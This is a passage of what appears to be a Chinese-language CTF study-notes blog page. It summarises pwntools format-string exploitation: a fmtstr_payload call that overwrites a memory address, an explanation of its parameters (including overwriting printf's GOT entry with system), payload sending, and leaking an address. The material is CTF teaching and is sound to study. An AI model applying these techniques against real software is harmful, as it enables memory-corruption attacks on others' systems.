        <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x0804C030</span>:<span class="number">5</span>&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上述为偏移量，写入地址，写入数据</span><br><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)</span><br><span class="line">第一个参数表示格式化字符串的偏移；</span><br><span class="line">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；本题是将0804a048处改为0x2223322</span><br><span class="line">第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span><br><span class="line">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br><span class="line">fmtstr_payload函数返回的就是payload</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;fun!\n&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>前者是在什么之后发送payload 部分题目卡的严需要分段发送，后方为发送内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))<span class="comment">#32为位数 4为接受地址的字节长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))<span class="comment">#hex为把数值转为16进制形式</span></span><br></pre></td></tr></table></figure>

<p>栈溢出要溢出数目（edp+距edp数目）+偏移数</p>
